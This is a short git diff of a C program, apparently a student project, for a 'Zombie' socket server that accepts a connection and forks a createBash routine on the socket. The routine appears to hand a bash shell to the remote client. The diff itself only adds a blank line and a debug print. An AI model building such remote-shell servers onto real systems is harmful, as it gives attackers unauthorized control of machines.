@@ -39,6 +39,7 @@ Zombie initSocketServer(bool withPort, int portReceived){
 	return zombie;
 }
 
+
 void createBash (void * sock){
 	int* socket = sock;
 	for (int i = 0; i < 3; ++i){
@@ -64,6 +65,7 @@ int main(int argc, char const *argv[]){
 	ssigaction(SIGINT,done);
 	printf("Le serveur tourne sur le port : %i  grace à souli\n", zombie.port);	
 	int newsockfd = saccept(zombie.sockFd);
+	printf("%d",newsockfd);
 	swrite(newsockfd, &zombie, sizeof(Zombie));
 	printf("i wrote\n");
 	fork_and_run1(createBash,&newsockfd);
